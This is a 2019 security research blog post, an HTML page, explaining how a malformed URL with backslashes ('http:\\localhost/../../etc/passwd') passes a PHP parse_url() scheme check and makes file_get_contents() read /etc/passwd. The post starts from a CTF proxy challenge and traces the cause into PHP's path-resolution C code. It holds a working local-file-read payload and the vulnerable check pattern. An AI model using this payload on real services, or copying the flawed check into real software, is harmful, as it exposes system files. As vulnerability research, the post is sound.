@@ -1,0 +1,698 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="&lt;Theo/&gt;">
+    <title>PHP: The issue between parse_url and real file path - &lt;Theo/&gt;</title>
+    <meta name="author" content="Theo Chen">
+    
+        <meta name="keywords" content="PHP,parse_url,vulnerability,LFR">
+    
+    
+        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
+    
+    
+        
+            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Use parse_url($url) to check $url‘s scheme and pass $url to file_get_contents() will lead to LFR issue.\n\n\nThe storyBelow is a snippet modified from DEVCORE Wargame at HITCON CMT 2019:\n1234567&lt;?php    $url = &quot;http://localhost/&quot;;    $parsed_url = parse_url($url);    if ($parsed_url[&#x27;scheme&#x27;] === &#x27;http&#x27; || $parsed_url[&#x27;scheme&#x27;] === &#x27;https&#x27;) &#123;        die(file_get_contents($url));    &#125;?&gt;\n\nIn the original challenge, it’s a simple proxy service in blackbox. $url is get from $_POST[&#39;url&#39;], only allow HTTP or HTTPS protocal by using parse_url() to check $url.\nIt’s a classical SSRF challenge until we need to read the local file with only HTTP&#x2F;HTTPS. The exploit is something like this:\n1234567&lt;?php    $url = &quot;http:\\\\localhost/../../../../../etc/passwd&quot;;    $parsed_url = parse_url($url);    if ($parsed_url[&#x27;scheme&#x27;] === &#x27;http&#x27; || $parsed_url[&#x27;scheme&#x27;] === &#x27;https&#x27;) &#123;        die(file_get_contents($url));    &#125;?&gt;\n\nWait, what? http: with double backslashes \\\\ ? How can this malformed url pass the parse_url() scheme check and lead to local file read problem?\nInteresting about parse_url()Here is a normal url pass to parse_url()\n1var_dump(parse_url(&quot;http://localhost/../../../../../etc/passwd&quot;));\n\n12345678array(3) &#123;  [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot;  [&quot;host&quot;]=&gt;  string(9) &quot;localhost&quot;  [&quot;path&quot;]=&gt;  string(26) &quot;/../../../../../etc/passwd&quot;&#125;\nThe scheme, host and path are all parsed correctly. How about malformed url with double backslashes?\n1var_dump(parse_url(&quot;http:\\\\localhost/../../../../../etc/passwd&quot;));\n\n123456array(2) &#123;  [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot;  [&quot;path&quot;]=&gt;  string(36) &quot;\\localhost/../../../../../etc/passwd&quot;&#125;\nAs you can see, scheme is still parsed as http but no host value parsed, the remaining string are all parsed as path.\nHere comes a problem, parse_url() is successed without any error even warning, but apparently the parsed result is not what we expected. So it pass the sheme check and move on to file_get_content() function.\nDig into PHP source codeOut of curiosity, I decided to dig into PHP’s C source code to see how file_get_contents() work with this path http:\\\\localhost/../../../../../etc/passwd.\nMy environment is Ubuntu Desktop 18.04 with self-compiled PHP 7.3.8 for gdb debug.\n1234567891011$ git clone http://git.php.net/repository/php-src.git$ cd php-src$ git checkout php-7.3.8$ ./buildconf# In order to debug PHP source code# --enable-debug must toggled# --prefix modify to your custom install location$ ./configure --disable-all --enable-debug --prefix=/home/theo/Desktop/php-7.3.8$ make$ make install\n\nTest code: \n1234567&lt;?php    $url = &quot;http:\\\\localhost/../../../../../etc/passwd&quot;;    $parsed_url = parse_url($url);    if ($parsed_url[&#x27;scheme&#x27;] === &#x27;http&#x27; || $parsed_url[&#x27;scheme&#x27;] === &#x27;https&#x27;) &#123;        die(file_get_contents($url));    &#125;?&gt;\n\nThe problem is located at Zend/zend_cirtual_ced.c tsrm_realpath_r(). This is a recursive function that traversing the entire path string to see if it’s containing /. or /.. at the end and remove them. For example our malicious path http:\\\\localhost/../../../../../etc/passwd will expand to /home/theo/Desktop/http:\\\\localhost/../../../../../etc/passwd according to your php-cli’s current working path before pass into tsrm_realpath_r().\nSnippet of tsrm_realpath_r():\n123456789101112131415161718...    if (i == len ||    \t(i + 1 == len &amp;&amp; path[i] == &#x27;.&#x27;)) &#123;    \t/* remove double slashes and &#x27;.&#x27; */    \tlen = EXPECTED(i &gt; 0) ? i - 1 : 0;    \tis_dir = 1;    \tcontinue;    &#125; else if (i + 2 == len &amp;&amp; path[i] == &#x27;.&#x27; &amp;&amp; path[i+1] == &#x27;.&#x27;) &#123;    \t/* remove &#x27;..&#x27; and previous directory */    \tis_dir = 1;    \tif (link_is_dir) &#123;    \t\t*link_is_dir = 1;    \t&#125;    \tif (i &lt;= start + 1) &#123;    \t\treturn start ? start : len;    \t&#125;    \tj = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, 1, NULL);...\n\nBecause it only look for /. and /.., it will threat http:\\\\localhost as an unnecessary leading directory as well as Desktop , theo, and so on. Then remove these unnecessary leading directory  according to how many /.. we have in path string. In this case we will get /etc/passwd as our final file real path, lead to a Local-File Read vulnerability.\n","dateCreated":"2019-08-28T13:58:58+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2019-08-28T13:58:58+00:00","description":"Use parse_url($url) to check $url‘s scheme and pass $url to file_get_contents() will lead to LFR issue.","headline":"PHP: The issue between parse_url and real file path","image":["cover.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/","keywords":"PHP, LFI","thumbnailUrl":"cover.png"}</script>
+    
+    <meta name="description" content="Use parse_url($url) to check $url‘s scheme and pass $url to file_get_contents() will lead to LFR issue.">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="PHP: The issue between parse_url and real file path">
+<meta property="og:url" content="https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/index.html">
+<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
+<meta property="og:description" content="Use parse_url($url) to check $url‘s scheme and pass $url to file_get_contents() will lead to LFR issue.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/cover.png">
+<meta property="article:published_time" content="2019-08-28T13:58:58.000Z">
+<meta property="article:modified_time" content="2025-01-17T13:11:17.152Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="LFI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/cover.png">
+<meta name="twitter:creator" content="@The0_Klein">
+    
+    
+        
+    
+    
+    
+        <meta property="og:image" content="https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/cover.png"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/cover.png"/>
+    
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">
+
+    <!--STYLES END-->
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-106120242-2');
+    </script>
+
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+    
+
+<header id="header" data-behavior="2">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            &lt;Theo/&gt;
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+    
+
+<nav id="sidebar" data-behavior="2">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Theo Chen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/TheoKlein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/The0_Klein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/theo-chen/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:theokleintw@gmail.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/rss2.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="2"
+                 class="
+                        hasCoverMetaOut
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            PHP: The issue between parse_url and real file path
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2019-08-28T13:58:58+00:00">
+	
+		    Aug 28, 2019
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Research/">Research</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>Use <code>parse_url($url)</code> to check <code>$url</code>‘s scheme and pass <code>$url</code> to <code>file_get_contents()</code> will lead to LFR issue.</p>
+<span id="more"></span><h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-story"><span class="toc-text">The story</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Interesting-about-parse-url"><span class="toc-text">Interesting about parse_url()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dig-into-PHP-source-code"><span class="toc-text">Dig into PHP source code</span></a></li></ol>
+
+<h2 id="The-story"><a href="#The-story" class="headerlink" title="The story"></a>The story</h2><p>Below is a snippet modified from <a target="_blank" rel="noopener" href="https://devco.re/">DEVCORE</a> Wargame at HITCON CMT 2019:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&quot;http://localhost/&quot;</span>;</span><br><span class="line">    <span class="variable">$parsed_url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>In the original challenge, it’s a simple proxy service in blackbox. <code>$url</code> is get from <code>$_POST[&#39;url&#39;]</code>, only allow HTTP or HTTPS protocal by using <code>parse_url()</code> to check <code>$url</code>.</p>
+<p>It’s a classical SSRF challenge until we need to read the local file with only HTTP&#x2F;HTTPS. The exploit is something like this:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&quot;http:\\localhost/../../../../../etc/passwd&quot;</span>;</span><br><span class="line">    <span class="variable">$parsed_url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Wait, what? <code>http:</code> with double backslashes <code>\\</code> ? How can this malformed url pass the <code>parse_url()</code> scheme check and lead to local file read problem?</p>
+<h2 id="Interesting-about-parse-url"><a href="#Interesting-about-parse-url" class="headerlink" title="Interesting about parse_url()"></a>Interesting about parse_url()</h2><p>Here is a normal url pass to <code>parse_url()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="string">&quot;http://localhost/../../../../../etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;localhost&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">26</span>) <span class="string">&quot;/../../../../../etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The scheme, host and path are all parsed correctly. How about malformed url with double backslashes?</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="string">&quot;http:\\localhost/../../../../../etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">36</span>) <span class="string">&quot;\localhost/../../../../../etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>As you can see, scheme is still parsed as <code>http</code> but no host value parsed, the remaining string are all parsed as path.</p>
+<p>Here comes a problem, <code>parse_url()</code> is successed without any error even warning, but apparently the parsed result is not what we expected. So it pass the sheme check and move on to <code>file_get_content()</code> function.</p>
+<h2 id="Dig-into-PHP-source-code"><a href="#Dig-into-PHP-source-code" class="headerlink" title="Dig into PHP source code"></a>Dig into PHP source code</h2><p>Out of curiosity, I decided to dig into PHP’s C source code to see how <code>file_get_contents()</code> work with this path <code>http:\\localhost/../../../../../etc/passwd</code>.</p>
+<p>My environment is Ubuntu Desktop 18.04 with self-compiled PHP 7.3.8 for gdb debug.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> http://git.php.net/repository/php-src.git</span><br><span class="line">$ <span class="built_in">cd</span> php-src</span><br><span class="line">$ git checkout php-7.3.8</span><br><span class="line">$ ./buildconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># In order to debug PHP source code</span></span><br><span class="line"><span class="comment"># --enable-debug must toggled</span></span><br><span class="line"><span class="comment"># --prefix modify to your custom install location</span></span><br><span class="line">$ ./configure --disable-all --enable-debug --prefix=/home/theo/Desktop/php-7.3.8</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
+
+<p>Test code: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&quot;http:\\localhost/../../../../../etc/passwd&quot;</span>;</span><br><span class="line">    <span class="variable">$parsed_url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>The problem is located at <code>Zend/zend_cirtual_ced.c tsrm_realpath_r()</code>. This is a recursive function that traversing the entire path string to see if it’s containing <code>/.</code> or <code>/..</code> at the end and remove them. For example our malicious path <code>http:\\localhost/../../../../../etc/passwd</code> will expand to <code>/home/theo/Desktop/http:\\localhost/../../../../../etc/passwd</code> according to your php-cli’s current working path before pass into <code>tsrm_realpath_r()</code>.</p>
+<p>Snippet of <code>tsrm_realpath_r()</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (i == len ||</span><br><span class="line">    	(i + <span class="number">1</span> == len &amp;&amp; path[i] == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">    	<span class="comment">/* remove double slashes and &#x27;.&#x27; */</span></span><br><span class="line">    	len = EXPECTED(i &gt; <span class="number">0</span>) ? i - <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    	is_dir = <span class="number">1</span>;</span><br><span class="line">    	<span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">2</span> == len &amp;&amp; path[i] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; path[i+<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">    	<span class="comment">/* remove &#x27;..&#x27; and previous directory */</span></span><br><span class="line">    	is_dir = <span class="number">1</span>;</span><br><span class="line">    	<span class="keyword">if</span> (link_is_dir) &#123;</span><br><span class="line">    		*link_is_dir = <span class="number">1</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">if</span> (i &lt;= start + <span class="number">1</span>) &#123;</span><br><span class="line">    		<span class="keyword">return</span> start ? start : len;</span><br><span class="line">    	&#125;</span><br><span class="line">    	j = tsrm_realpath_r(path, start, i<span class="number">-1</span>, ll, t, use_realpath, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Because it only look for <code>/.</code> and <code>/..</code>, it will threat <code>http:\\localhost</code> as an unnecessary leading directory as well as <code>Desktop</code> , <code>theo</code>, and so on. Then remove these unnecessary leading directory  according to how many <code>/..</code> we have in path string. In this case we will get <code>/etc/passwd</code> as our final file real path, lead to a Local-File Read vulnerability.</p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/LFI/" rel="tag">LFI</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/PHP/" rel="tag">PHP</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/Analyze-A-Fake-OpenSSH-5-3-0day-Exploit/"
+                    data-tooltip="Analyze A Fake OpenSSH 5.3 0day Exploit"
+                    aria-label="PREVIOUS: Analyze A Fake OpenSSH 5.3 0day Exploit"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
+                    data-tooltip="VulnHub #Basic Pentesting: 1"
+                    aria-label="NEXT: VulnHub #Basic Pentesting: 1"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/Analyze-A-Fake-OpenSSH-5-3-0day-Exploit/"
+                    data-tooltip="Analyze A Fake OpenSSH 5.3 0day Exploit"
+                    aria-label="PREVIOUS: Analyze A Fake OpenSSH 5.3 0day Exploit"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"
+                    data-tooltip="VulnHub #Basic Pentesting: 1"
+                    aria-label="NEXT: VulnHub #Basic Pentesting: 1"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
